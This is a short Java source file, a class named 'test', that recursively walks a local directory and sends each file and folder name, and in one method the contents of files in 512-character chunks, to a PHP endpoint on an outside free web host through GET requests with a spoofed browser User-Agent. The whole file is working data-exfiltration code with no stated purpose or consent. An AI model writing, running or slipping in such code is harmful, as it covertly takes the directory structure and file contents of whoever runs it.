import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;
import java.util.ArrayList;
import java.io.*;

public class test {

	public static void main(String[] args) throws Exception {
		// TODO Auto-generated method stub
		test t = new test();
		t.printFileTree(new File("C:\\MinGW"),0);
	}
	private void readfile(String path) throws Exception{
		FileReader fr = new FileReader(path);
		BufferedReader bfr = new BufferedReader(fr);
		String data;
		while((data = bfr.readLine())!=null) {
			if(data.length()>=512) {
				for(int i=0;i+512<=data.length();i+=512) {
					String EncodedData = URLEncoder.encode(data.substring(i,i+512)+"\n","UTF-8");
					String url = "https://unsheathed-moments.000webhostapp.com/readData.php?line=" + EncodedData;
					HttpURLConnection httpClient = (HttpURLConnection) new URL(url).openConnection();
			        // optional default is GET
			        httpClient.setRequestMethod("GET");
			        //add request header
			        httpClient.setRequestProperty("User-Agent", "Mozilla/5.0");
			        int resCode = httpClient.getResponseCode();
			        System.out.println(resCode);
				}
			}else {
				String EncodedData = URLEncoder.encode(data +"\n","UTF-8");
				String url = "https://unsheathed-moments.000webhostapp.com/readData.php?line=" + EncodedData;
				HttpURLConnection httpClient = (HttpURLConnection) new URL(url).openConnection();
		        // optional default is GET
		        httpClient.setRequestMethod("GET");
		        //add request header
		        httpClient.setRequestProperty("User-Agent", "Mozilla/5.0");
		        int resCode = httpClient.getResponseCode();
		        System.out.println(resCode);
			}
			
		}
	}
	private ArrayList<String> fileList(String filePath){
    	ArrayList<String> list= new ArrayList<String>();
    	File file = new File(filePath);
    	if(file.isDirectory()){
    		if(!filePath.matches(".*\\\\$")) filePath += "\\";
    		list.add(filePath);
    		for(String fileName:file.list()){
    			list.addAll(this.fileList(filePath + fileName));
    		}
    		return list;
    	}else{
    		list.add(filePath.toString());
    		return list;
    	}
	}
	public void printFileTree(File file, int level) throws Exception {
		for(int i=0;i<level;i++) {              
			//System.out.print("\t");
			this.sentData("line", "\t");
		}
		//System.out.println(file.getName());
		this.sentData("line",file.getName()+"\n");
		if(file.isDirectory()&&!file.getCanonicalPath().matches("..")) {
			File[] files=file.listFiles();
			for(File temp:files) {
				printFileTree(temp,level+1);
			}
		}
	}
	public void sentData(String get,String dataWithoutNL) throws Exception {
		String EncodedData = URLEncoder.encode(dataWithoutNL,"UTF-8");
		String url = "https://unsheathed-moments.000webhostapp.com/readData.php?"+ get +"=" + EncodedData;
		HttpURLConnection httpClient = (HttpURLConnection) new URL(url).openConnection();
        // optional default is GET
        httpClient.setRequestMethod("GET");
        //add request header
        httpClient.setRequestProperty("User-Agent", "Mozilla/5.0");
        int resCode = httpClient.getResponseCode();
        System.out.println(resCode);
	}
}
